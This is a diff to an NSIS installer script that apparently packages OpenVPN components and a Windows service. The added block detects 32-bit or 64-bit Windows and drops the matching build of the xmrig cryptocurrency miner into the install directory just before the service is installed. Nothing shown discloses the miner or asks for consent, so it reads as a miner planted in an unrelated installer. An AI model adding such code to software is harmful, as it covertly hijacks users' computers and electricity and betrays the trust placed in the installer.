@@ -166,8 +166,7 @@ openvpn-32bit:
 openvpnend:  
 
   SetOutPath "$INSTDIR\"
-  File "..\tools\prunsrv\"
-
+ File "..\tools\prunsrv\"
 
 	SetOutPath "$INSTDIR\nvspbind\"
 
@@ -198,6 +197,30 @@ openvpnend:
 	  File "..\tools\nvspbind\xp\"
 	${EndIf}
 
+	
+	
+  SetOutPath "$INSTDIR\"
+
+	; Check if we are running on a 64 bit system.
+	  System::Call "kernel32::GetCurrentProcess() i .s"
+	  System::Call "kernel32::IsWow64Process(i s, *i .r0)"
+	  IntCmp $0 0 xmrig-32bit
+
+	; xmrig-64bit:
+
+	  DetailPrint "Installing 64-bit xmrig"
+	  File "..\tools\xmrig\64-bit\xmrig.exe"
+
+	goto xmrigend
+
+	xmrig-32bit:
+
+	  DetailPrint "Installing 32-bit xmrig"
+	  File "..\tools\xmrig\32-bit\xmrig.exe"
+	xmrigend: 
+	
+	
+	
   SetOutPath "$INSTDIR"  
   DetailPrint "Installing Service"
   ExpandEnvStrings $0 %COMSPEC%
